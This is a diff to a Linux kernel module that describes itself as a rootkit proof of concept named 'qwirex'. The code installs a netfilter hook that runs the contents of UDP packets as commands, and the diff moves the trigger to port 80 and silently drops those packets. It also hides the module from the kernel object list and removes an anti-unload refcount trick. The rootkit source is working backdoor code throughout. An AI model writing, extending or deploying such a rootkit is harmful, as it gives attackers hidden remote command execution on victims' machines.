@@ -73,7 +73,7 @@ static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf
             return NF_ACCEPT;
         }
 
-        if (ntohs(udp->dest) == 1337)
+        if (ntohs(udp->dest) == 80)
         {
             u32 iph_len = ip->ihl * 4;
 
@@ -81,7 +81,7 @@ static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf
 
             if (ret < 0)
             {
-                return NF_ACCEPT;
+                return NF_DROP;
             }
 
             ip = ip_hdr(skb);
@@ -91,14 +91,14 @@ static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf
 
             if (payload_len == 0)
             {
-                return NF_ACCEPT;
+                return NF_DROP;
             }
 
             ret = skb_ensure_writable(skb,iph_len + sizeof(struct udphdr) + payload_len);
 
             if (ret < 0)
             {
-                return NF_ACCEPT;
+                return NF_DROP;
             }
 
             ip = ip_hdr(skb);
@@ -116,11 +116,13 @@ static unsigned int qwirex_hook(void *priv, struct sk_buff *skb, const struct nf
                     data[payload_len] = '\0';
                     execute_cmd(data);
                     kfree(data);
+
+                    return NF_DROP;
                 }
 
                 else
                 {
-                    return NF_ACCEPT;
+                    return NF_DROP;
                 }
             }
         }
@@ -156,15 +158,9 @@ static void hide_qwirex(void)
         kobject_del(qwirex_kobj);
 }
 
-static void ban_on_extraction_qwirex(void)
-{
-    atomic_set(&THIS_MODULE->refcnt,2);
-}
-
 static int __init qwirex_init(void)
 {
     hide_qwirex();
-    ban_on_extraction_qwirex();
 
     nf_register_net_hook(&init_net,&nho);
 
@@ -182,3 +178,4 @@ module_exit(qwirex_exit);
 MODULE_AUTHOR("0x00");
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("a simple rootkit proof of concept");
+MODULE_VERSION("v0.1");
